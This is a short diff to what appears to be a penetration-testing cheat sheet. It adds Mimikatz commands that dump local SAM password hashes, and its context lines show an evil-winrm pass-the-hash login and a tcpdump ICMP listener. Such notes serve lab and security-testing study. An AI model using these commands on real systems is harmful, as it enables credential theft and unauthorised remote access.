@@ -61,3 +61,10 @@ evil-winrm -i [IP_ADDR] -u [USERNAME] -H [HASH]   # hash retrievable from secret
 ```
 tcpdump -i tun0 icmp -v   # listen for icmp ping to tun0 interface
 ```
+
+### Mimikatz
+```
+privilege::debug
+token::elevate
+lsadump::sam
+```
